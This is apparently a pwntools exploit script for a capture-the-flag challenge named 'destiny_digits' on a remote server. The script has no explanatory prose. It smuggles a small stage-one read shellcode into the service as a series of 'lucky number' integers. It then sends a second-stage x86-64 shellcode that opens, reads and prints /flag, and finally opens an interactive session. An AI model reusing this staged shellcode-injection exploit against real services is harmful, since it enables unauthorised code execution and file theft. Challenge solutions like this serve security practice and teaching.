from pwn import *

context.arch = "x86_64"

def reverse_hex(inp):
    l = [inp[i:i+2] for i in range(0, len(inp), 2)]
    reverse = l[::-1]
    concatted = "".join(reverse)
    return concatted

#p = process("./destiny_digits")
#gdb.attach(p)

p = remote("flu.xxx", 10110)

shellcode = "30c0488b7424104883c63683c2640f05"

numbers = [255 for _ in range(0x80)]

for i in range(0, len(shellcode), 8):
    if len(shellcode)-i < 8:
        numbers[int(i/8)] = int(reverse_hex(shellcode[i:]), 16)
    numbers[int(i/8)] = int(reverse_hex(shellcode[i:i+8]), 16)

p.recvuntil(b"What's your lucky number? ")
log.info(f"sending {hex(numbers[0])}")
p.sendline(str(numbers[0]).encode())

for i in range(1, 0x80):
    p.recvuntil(b"Got another one?")
    if numbers[i] != 0xff:
        log.info(f"sending {hex(numbers[i])}")
    p.sendline(str(numbers[i]).encode())

# sh = shellcraft.open("/flag")
# sh += shellcraft.read(3, 'rsp', 0x100)
# sh += shellcraft.write(1, 'rsp', 0x100)

sh = f'''/* open(file='/flag', oflag=0, mode=0) */
    /* push b'/flag\x00' */
    mov rax, 0x101010101010101
    push rax
    mov rax, 0x101010101010101 ^ 0x67616c662f
    xor [rsp], rax
    mov rdi, rsp
    xor edx, edx /* 0 */
    xor esi, esi /* 0 */
    /* call open() */
    push SYS_open /* 2 */
    pop rax
    syscall
    /* call read(3, 'rsp', 0x100) */
    push rax /* guarantees correct fd */
    xor eax, eax /* SYS_read */
    pop rdi
    xor edx, edx
    mov dh, 0x100 >> 8
    mov rsi, rsp
    syscall
    /* write(fd=1, buf='rsp', n=0x100) */
    push 1
    pop rdi
    xor edx, edx
    mov dh, 0x100 >> 8
    mov rsi, rsp
    /* call write() */
    push SYS_write /* 1 */
    pop rax
    syscall
'''

shellcode2 = asm(sh)

p.recvuntil(b"...")
sleep(2)
p.sendline(shellcode2)

p.interactive()